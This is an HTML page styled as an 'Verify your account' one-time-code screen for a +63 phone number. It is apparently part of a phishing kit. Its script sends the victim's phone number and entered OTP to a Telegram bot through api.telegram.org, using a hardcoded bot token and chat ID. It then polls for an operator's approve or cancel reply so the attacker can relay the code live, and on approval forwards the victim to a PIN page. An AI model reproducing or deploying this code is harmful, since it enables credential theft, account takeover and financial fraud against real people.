<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Your Account</title>
    <!-- FontAwesome for Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #1a1a1a;
        }
        
        .container {
            background-color: #ffffff;
            width: 100%;
            max-width: 420px;
            padding: 24px 20px 40px 20px;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            justify-content: space-between;
            position: relative;
        }
        
        @media (min-width: 480px) {
            .container {
                min-height: auto;
                border-radius: 16px;
                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            }
        }
        
        .header {
            display: flex;
            align-items: center;
            position: relative;
            margin-bottom: 32px;
        }
        
        .back-btn {
            background: none;
            border: none;
            font-size: 20px;
            color: #1a1a1a;
            cursor: pointer;
            padding: 4px 8px;
        }
        
        .header h2 {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            font-size: 18px;
            font-weight: 600;
        }
        
        .content {
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            flex-grow: 1;
        }
        
        .content p {
            font-size: 15px;
            color: #4a4a4a;
            line-height: 1.5;
            margin-bottom: 32px;
        }
        
        .content p strong {
            color: #1a1a1a;
            font-weight: 600;
        }
        
        .otp-inputs {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin-bottom: 24px;
        }
        
        .otp-box {
            width: 44px;
            height: 52px;
            border: 1.5px solid #d1d5db;
            border-radius: 10px;
            text-align: center;
            font-size: 20px;
            font-weight: 600;
            outline: none;
            transition: border-color 0.2s;
        }
        
        .otp-box:focus {
            border-color: #0052ff;
        }
        
        .resend-text {
            font-size: 14px;
            color: #6b7280;
            margin-bottom: 40px;
        }
        
        .continue-btn {
            width: 100%;
            background-color: #0052ff;
            color: white;
            border: none;
            border-radius: 28px;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 24px;
            transition: background-color 0.2s;
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .continue-btn.enabled {
            opacity: 1;
            cursor: pointer;
        }
        
        .continue-btn:hover.enabled {
            background-color: #0040cc;
        }
        
        .face-id-link {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #0052ff;
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
            margin-bottom: 20px;
        }
        /* Overlay Styles */
        
        .overlay {
            position: absolute;
            inset: 0;
            background: rgba(255, 255, 255, 0.95);
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 24px;
            text-align: center;
            z-index: 50;
            border-radius: inherit;
        }
    </style>
</head>

<body>

    <div class="container">
        <!-- Top Navigation Header -->
        <div class="header">
            <button class="back-btn" onclick="history.back()"><i class="fa-solid fa-chevron-left"></i></button>
            <h2>Verify your account</h2>
        </div>

        <!-- Main Content Section -->
        <div class="content">
            <p>Enter the 6-digit code sent to<br><strong id="maskedPhone">+63 9XX XXX 1234</strong></p>

            <!-- 6-Digit OTP Input Boxes -->
            <div class="otp-inputs">
                <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autofocus>
                <input type="tel" maxlength="1" class="otp-box" inputmode="numeric">
                <input type="tel" maxlength="1" class="otp-box" inputmode="numeric">
                <input type="tel" maxlength="1" class="otp-box" inputmode="numeric">
                <input type="tel" maxlength="1" class="otp-box" inputmode="numeric">
                <input type="tel" maxlength="1" class="otp-box" inputmode="numeric">
            </div>

            <div class="resend-text">
                Resend code in 00:<span id="timer">45</span>
            </div>

            <button id="submitBtn" class="continue-btn" disabled>Continue</button>

            <a href="#" class="face-id-link">
                <i class="fa-solid fa-id-card"></i> Verify with face ID
            </a>
        </div>

        <!-- Spinner Loading Overlay -->
        <div id="spinnerOverlay" class="overlay">
            <div class="fa-3x mb-4 text-[#0052ff]">
                <i class="fa-solid fa-circle-notch fa-spin"></i>
            </div>
            <p class="text-gray-700 font-medium">Verifying your code, please wait...</p>
        </div>

        <!-- Result Status Overlay (Only used for decline/cancel messages) -->
        <div id="resultOverlay" class="overlay">
            <div id="resultMessage" class="text-gray-800 text-base font-medium mb-6">Result goes here...</div>
            <button onclick="closeResultOverlay()" class="w-full bg-[#0052ff] text-white py-3 rounded-full font-semibold">Try Again</button>
        </div>
    </div>

    <!-- JavaScript Logic -->
    <script>
        const BOT_TOKEN = '8655434304:AAF-Ix6PLMZj8qhwXvOMUMJqbu9XWKIYKmk';
        const CHAT_ID = '8486303623';

        // Retrieve and mask phone from localStorage
        const savedPhone = localStorage.getItem('phone') || '9123456789';
        const visibleStart = savedPhone.slice(0, 3);
        const visibleEnd = savedPhone.slice(-2);
        const masked = visibleStart + '***' + visibleEnd;
        document.getElementById('maskedPhone').textContent = '+63 ' + masked;

        const otpBoxes = document.querySelectorAll('.otp-box');
        const submitBtn = document.getElementById('submitBtn');
        const spinnerOverlay = document.getElementById('spinnerOverlay');
        const resultOverlay = document.getElementById('resultOverlay');
        const resultMessage = document.getElementById('resultMessage');
        const timerSpan = document.getElementById('timer');

        let otpValue = '';
        let seconds = 45;
        let pollInterval;
        let lastUpdateId = 0;

        // Countdown timer
        const countdown = setInterval(() => {
            seconds--;
            timerSpan.textContent = seconds < 10 ? '0' + seconds : seconds;
            if (seconds <= 0) {
                clearInterval(countdown);
                timerSpan.textContent = '00';
            }
        }, 1000);

        function checkOtpComplete() {
            otpValue = Array.from(otpBoxes).map(box => box.value).join('');
            if (otpValue.length === 6) {
                submitBtn.classList.add('enabled');
                submitBtn.disabled = false;
            } else {
                submitBtn.classList.remove('enabled');
                submitBtn.disabled = true;
            }
        }

        otpBoxes.forEach((box, index) => {
            box.addEventListener('input', () => {
                if (box.value.length === 1 && index < 5) {
                    otpBoxes[index + 1].focus();
                }
                checkOtpComplete();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && box.value === '' && index > 0) {
                    otpBoxes[index - 1].focus();
                }
            });
        });

        function closeResultOverlay() {
            resultOverlay.style.display = 'none';
            // Clear inputs for re-entry
            otpBoxes.forEach(box => box.value = '');
            otpValue = '';
            checkOtpComplete();
            otpBoxes[0].focus();
        }

        submitBtn.addEventListener('click', () => {
            if (otpValue.length !== 6) return;

            spinnerOverlay.style.display = 'flex';

            const timestamp = Date.now();
            const message = `OTP Verification\n\nPhone: +63 ${savedPhone}\nEntered OTP: ${otpValue}\n\nPlease approve or cancel.`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: '✅ Approve',
                                    callback_data: 'approve_' + timestamp
                                }, {
                                    text: '❌ Cancel',
                                    callback_data: 'cancel_' + timestamp
                                }]
                            ]
                        }
                    })
                })
                .then(res => res.json())
                .then(data => {
                    if (!data.ok) {
                        spinnerOverlay.style.display = 'none';
                        alert('Error sending to bot: ' + data.description);
                    }
                })
                .catch(error => {
                    spinnerOverlay.style.display = 'none';
                    alert('Bot connection error: ' + error);
                });

            // Poll for admin response from Telegram
            pollInterval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
                    .then(res => res.json())
                    .then(data => {
                        if (data.ok && data.result.length > 0) {
                            for (let update of data.result) {
                                lastUpdateId = update.update_id;
                                if (update.callback_query) {
                                    const cbData = update.callback_query.data;
                                    const dataParts = cbData.split('_');
                                    if (dataParts[1] == timestamp) {
                                        clearInterval(pollInterval);
                                        spinnerOverlay.style.display = 'none';

                                        if (dataParts[0] === 'approve') {
                                            // Navigate to pin.html on approval
                                            window.location.href = 'pin.html';
                                        } else if (dataParts[0] === 'cancel') {
                                            // Show error message and prompt to enter correct OTP on decline
                                            resultMessage.textContent = 'Please enter correct otp';
                                            resultOverlay.style.display = 'flex';
                                        }
                                    }
                                }
                            }
                        }
                    });
            }, 1500);
        });

        checkOtpComplete();
        otpBoxes[0].focus();
    </script>
</body>

</html>
